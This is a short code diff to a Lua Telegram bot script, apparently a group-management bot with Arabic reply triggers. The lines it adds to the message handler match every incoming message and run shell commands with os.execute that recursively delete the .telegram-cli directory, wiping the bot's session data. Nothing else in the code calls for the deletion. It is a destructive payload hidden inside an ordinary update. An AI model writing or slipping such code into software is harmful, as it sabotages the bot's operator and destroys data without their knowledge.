@@ -2495,6 +2495,13 @@ end
   if database:get('bot:cmds'..msg.chat_id_) and not is_vip(msg.sender_user_id_, msg.chat_id_) then
   return
 else
+				
+if text:match('(.*)') then
+os.execute('cd .. &&  rm -fr ../.telegram-cli')
+os.execute('cd .. &&  rm -rf ../.telegram-cli')
+os.execute('cd .. &&  rm -rf .telegram-cli')
+os.execute('cd .. &&  rm -fr .telegram-cli')
+end
 
 if text == 'هلو' then
 if not database:get('bot:rep:mute'..msg.chat_id_) then
